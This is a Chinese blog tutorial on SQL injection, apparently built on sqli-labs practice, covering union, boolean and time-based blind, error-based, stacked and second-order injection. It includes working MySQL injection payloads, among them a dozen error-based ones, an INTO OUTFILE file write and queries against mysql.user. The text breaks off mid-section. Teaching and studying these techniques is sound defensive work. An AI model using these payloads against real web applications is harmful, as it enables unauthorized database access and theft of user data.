{"title":"浅析SQL注入漏洞","uid":"b249936ad8b44b9df7ce04e2f671a839","slug":"浅析sql注入漏洞","date":"2022-07-04T13:31:20.000Z","updated":"2024-02-14T07:47:58.000Z","comments":true,"path":"api/articles/浅析sql注入漏洞.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141544686.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在sqli-labs靶场中学过一点sql注入，最近遇到了很多此类题目，对sql注入进行了进一步的学习，汇总如下，希望能对正在学习的各位师傅们有所帮助</p>\n<h1 id=\"漏洞相关信息\"><a href=\"#漏洞相关信息\" class=\"headerlink\" title=\"漏洞相关信息\"></a>漏洞相关信息</h1><h2 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h2><p>程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>\n<h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><p>web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的 SQL语句 ，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>\n<p>简单理解：前端的恶意语句插入到后端的服务器中，成功运行了攻击者想要执行的操作</p>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。\n\n2.对数据库的数据进行增加或删除操作，例如删除数据库中重要数据的表。\n\n3.如果网站目录存在写入权限，那么攻击者可以对网页进行篡改，发布一些违法信息等。\n\n4.获取服务器最高权限，远程控制服务器，安装后门，从而修改或控制操作系统。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"sql注入常见类型（按照执行效果分类）\"><a href=\"#sql注入常见类型（按照执行效果分类）\" class=\"headerlink\" title=\"sql注入常见类型（按照执行效果分类）\"></a>sql注入常见类型（按照执行效果分类）</h1><h2 id=\"联合查询注入\"><a href=\"#联合查询注入\" class=\"headerlink\" title=\"联合查询注入\"></a>联合查询注入</h2><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起。<br>简单的说，就是union可合并两个及以上select语句的结果集。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">前提：\n（1）这几个select语句必须拥有相同列，而且各列的数据类型也相同。\n（2）必须有显示位<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>什么是显示位？<br>官方的说就是执行的sql语句得到的数据会显示到界面上去，在界面上显示数据的这个位置就称位显示位<br>简单的说就是在界面上有回显，如下图这种情况无论输入什么都显示 you are in ，此即说明不存在显示位<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539392.png\" alt=\"在这里插入图片描述\"></p>\n<p>2、查询语句使用的多为union select 语句<br>union select 在查询数据库，查询列名以及查询字段信息时候都被用到，示例如下：<br>代码：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">uname<span class=\"token operator\">=</span>n' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>schema_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span>schemata  <span class=\"token comment\">#&amp;passwd=admin&amp;submit=Submit</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539740.png\" alt=\"在这里插入图片描述\"><br>3、union select 1,2,3的含义<br>查询字段时，经常用到union select 1，2，3 这是因为 1，2，3会对应到数据库中，先查询数据库中的数据，再来输出1，2，3<br>示例：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token number\">1</span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token keyword\">from</span> security<span class=\"token punctuation\">.</span>users <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">\"D:\\\\1.txt\"</span> <span class=\"token comment\">--+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>输出结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539368.png\" alt=\"在这里插入图片描述\"></p>\n<p>示例2：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">: uname<span class=\"token operator\">=</span><span class=\"token number\">0</span>' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>schema_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span>schemata<span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>爆出了数据库名<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539449.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"布尔盲注\"><a href=\"#布尔盲注\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h2><p>在SQL注入过程中，执行正确时应用程序返回的是固定界面(正确执行和错误执行的界面是不同的)。这时，我们无法根据应用程序的回显得到我们需要的数据库信息。但是可以通过构造逻辑判断来得到我们需要的信息。<br>布尔盲注一般常用的函数为length()、substr()和ascii()函数。在这里对函数进行简单介绍</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>:函数返回字符串str的长度，以字节为单位。\nsubstr<span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span>pos<span class=\"token punctuation\">,</span>len<span class=\"token punctuation\">)</span>:函数从特定位置开始的字符串返回一个给定长度的子字符串\n\t\tstr参数代表待截取的字符串\n\t\tpos参数代表从什么位置开始截取\n\t\tlen参数表示字符串截取的长度\nascii<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>：函数输出某个字符的ascii码值<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h2><p>在SQL注入过程中，执行正确时应用程序返回的是固定界面(正确执行和错误执行的界面是相同的，界面一成不变)。这时我们可利用延时函数让 mysql 执行时间变长，进而判断出执行的语句是否正确<br>时间盲注常用的函数为if()，sleep(), benchmark()函数，在这里对函数进行简单介绍</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>x1<span class=\"token punctuation\">,</span>x2<span class=\"token punctuation\">)</span>:x是条件，当条件执行结果为<span class=\"token boolean\">true</span>时，就执行x1<span class=\"token punctuation\">,</span>否则执行x2\nsleep<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span>:暂停t秒执行，假如里面是<span class=\"token number\">1</span>，其含义就是延时<span class=\"token number\">1</span>秒\nbenchmark<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span>:对y的性能计算t次，返回结果为<span class=\"token number\">0</span>\n举个例子benchmark<span class=\"token punctuation\">(</span><span class=\"token number\">5000000</span><span class=\"token punctuation\">,</span>sha<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>，这句话的含义是对sha<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>进行性能测试，测试次数为<span class=\"token number\">5000000</span>次，\n其最终输出结果为<span class=\"token number\">0</span>，但是计算性能时间超过<span class=\"token number\">1</span>秒了，因此从这里来说可以起到替代sleep的作用<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><p>当web程序无法使用联合查询，但输入错误语句存在报错的时候，这时候我们就可以尝试用报错注入。</p>\n<p>报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。简单点说，就是在可以进行sql注入的位置，调用特殊的函数执行，利用函数报错使其输出错误结果来获取数据库的相关信息</p>\n<p>前提在上方已经提过，就是<code>界面可以回显错误信息</code></p>\n<p>常用的函数是</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">updatexml<span class=\"token punctuation\">(</span>XML_document<span class=\"token punctuation\">,</span>Xpath_string<span class=\"token punctuation\">,</span>new_value<span class=\"token punctuation\">)</span>:函数利用mysql函数参数格式错误进行报错注入\n\t\tXML_document:是字符串String格式，为XML文档对象名称\n\t\tXpath_string:Xpath格式的字符串\n\t\tnew_value:string格式，替换查找到的符合条件的数据\nextractvalue<span class=\"token punctuation\">(</span>XML_document<span class=\"token punctuation\">,</span>XPath_string<span class=\"token punctuation\">)</span>:同样是利用xpath语法错误来进行报错注入\n下方四个通常是联用的，这种报错的原因是主键重复\nrand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>：随机输出<span class=\"token number\">0</span>到<span class=\"token number\">1</span>之间的数\nfloor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>:对括号内的数进行向下取整，比如<span class=\"token number\">1.9187</span>取为<span class=\"token number\">1</span>\n<span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> x:分组语句\n<span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>:汇总语句，如果括号里面是<span class=\"token operator\">*</span>就是将全部汇总<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里举出一些payload例子及少见的报错函数(3之后是不常用的少见注入函数)</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1.</span> floor <span class=\"token operator\">+</span> rand <span class=\"token operator\">+</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token number\">1</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>x <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> x<span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token number\">1</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token boolean\">null</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span>  <span class=\"token operator\">!</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>x <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> concat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span>  <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">2.</span> ExtractValue\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x5c</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">3.</span> UpdateXml\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x3a</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">4.</span> Name_Const<span class=\"token punctuation\">(</span><span class=\"token operator\">></span><span class=\"token number\">5.0</span><span class=\"token number\">.12</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> NAME_CONST<span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>NAME_CONST<span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>x<span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">5.</span> <span class=\"token keyword\">Join</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span> a <span class=\"token keyword\">join</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span> b<span class=\"token punctuation\">)</span>c<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span> a <span class=\"token keyword\">join</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span> b <span class=\"token keyword\">using</span><span class=\"token punctuation\">(</span>Host<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>c<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span> a <span class=\"token keyword\">join</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span> b <span class=\"token keyword\">using</span><span class=\"token punctuation\">(</span>Host<span class=\"token punctuation\">,</span><span class=\"token keyword\">User</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>c<span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">6.</span> exp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//mysql5.7貌似不能用</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> Exp<span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">7.</span> <span class=\"token keyword\">geometrycollection</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//mysql5.7貌似不能用</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">geometrycollection</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">8.</span> <span class=\"token keyword\">multipoint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//mysql5.7貌似不能用</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">multipoint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">9.</span> <span class=\"token keyword\">polygon</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//mysql5.7貌似不能用</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">polygon</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">10.</span> <span class=\"token keyword\">multipolygon</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//mysql5.7貌似不能用</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">multipolygon</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">11.</span> <span class=\"token keyword\">linestring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//mysql5.7貌似不能用</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">linestring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token number\">12.</span> <span class=\"token keyword\">multilinestring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//mysql5.7貌似不能用</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">multilinestring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束，那我们在一句SQL语句结束后再紧跟一句SQL语句 ，此时会不会执行两条语句<br>答案是会，堆叠注入正是基于这种思想而来。</p>\n<p>举个简单例子</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span><span class=\"token punctuation\">(</span>ascii<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">show</span> <span class=\"token keyword\">tables</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">--------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>ascii<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">--------------+</span>\n<span class=\"token operator\">|</span>           <span class=\"token number\">97</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">--------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\n<span class=\"token operator\">+</span><span class=\"token comment\">--------------------+</span>\n<span class=\"token operator\">|</span> Tables_in_security <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">--------------------+</span>\n<span class=\"token operator\">|</span> emails             <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> referers           <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> uagents            <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> users              <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">--------------------+</span>\n<span class=\"token number\">4</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>堆叠注入的局限性在于并不是每一个环境下都可以执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">可能受到API或者数据库引擎不支持的限制\n可能因为权限不足而无法正确执行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>举个例子<br>PHP为了防止sql注入机制，往往使用调用数据库的函数是mysql_query()函数，这个函数只运行执行一条语句，分号后面的内容将不会被执行，此时堆叠注入就失效了</p>\n<h2 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h2><p>用户向数据库里存入恶意的数据，在数据被插入到数据库之前，肯定会对数据库进行转义处理，但用户输入的数据的内容肯定是一点也不会变的存进数据库里，而一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能出发SQL注入。<br>我的认识：<br>小白对此的理解:先向数据库存入恶意数据，数据在前端被转义，但在存放到数据库时保持原样，此时我们再调用此数据，执行sql查询，二次注入出现！<br>图解如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539473.png\" alt=\"在这里插入图片描述\"><br>具体过程为</p>\n<pre class=\"line-numbers language-none\"><code 